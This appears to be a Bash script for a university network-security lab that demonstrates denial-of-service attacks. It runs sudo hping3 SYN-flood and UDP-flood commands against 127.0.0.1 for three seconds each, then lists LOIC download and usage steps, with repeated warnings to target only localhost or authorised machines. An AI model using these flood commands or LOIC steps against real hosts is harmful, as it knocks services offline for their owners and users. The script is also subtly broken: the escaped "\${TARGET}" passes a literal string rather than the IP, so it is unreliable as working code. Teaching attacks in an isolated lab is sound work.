#!/bin/bash
# ============================================================================
# 实验三：DoS 攻击演示（LOIC / hping3）
# 课程：网络信息安全
# 姓名缩写：zjx
# 严重警告：仅允许针对本机/授权实验环境！
# 严禁攻击公网地址，违者承担法律责任！
# ============================================================================

set -euo pipefail

echo "========================================"
echo "  实验三：DoS 攻击演示"
echo "  操作人：zjx"
echo "========================================"
echo "  ⚠️  警告：仅限本机 127.0.0.1 测试！"
echo "========================================"

TARGET="127.0.0.1"

echo ""
echo "【步骤 1】hping3 SYN Flood 攻击演示"
echo "----------------------------------------"
echo "\$ sudo hping3 -S -p 80 --flood \${TARGET}"
echo "[提示] 按 Ctrl+C 停止，演示 3 秒..."
timeout 3 sudo hping3 -S -p 80 --flood "\${TARGET}" 2>&1 || echo "[已停止] SYN flood 演示结束"

echo ""
echo "【步骤 2】hping3 UDP Flood 攻击演示"
echo "----------------------------------------"
echo "\$ sudo hping3 --udp -p 53 --flood \${TARGET}"
echo "[提示] 按 Ctrl+C 停止，演示 3 秒..."
timeout 3 sudo hping3 --udp -p 53 --flood "\${TARGET}" 2>&1 || echo "[已停止] UDP flood 演示结束"

echo ""
echo "【步骤 3】LOIC 安装说明"
echo "----------------------------------------"
echo "LOIC (Low Orbit Ion Cannon) 为 GUI 工具，"
echo "需在 Windows 下运行或使用 mono 在 Linux 运行。"
echo ""
echo "下载地址：https://github.com/NewEraCracker/LOIC"
echo ""
echo "【LOIC 使用步骤（GUI 截图用）】"
echo "  1. 输入 Target IP: 127.0.0.1"
echo "  2. 选择攻击方法: TCP / UDP / HTTP"
echo "  3. 设置线程数: 10"
echo "  4. 点击 [IMMA CHARGIN MAH LAZER]"
echo "  5. 观察目标响应"
echo ""
echo "⚠️ 再次强调：仅允许攻击 127.0.0.1 或授权靶机！"

echo ""
echo "========================================"
echo "  实验三完成"
echo "========================================"
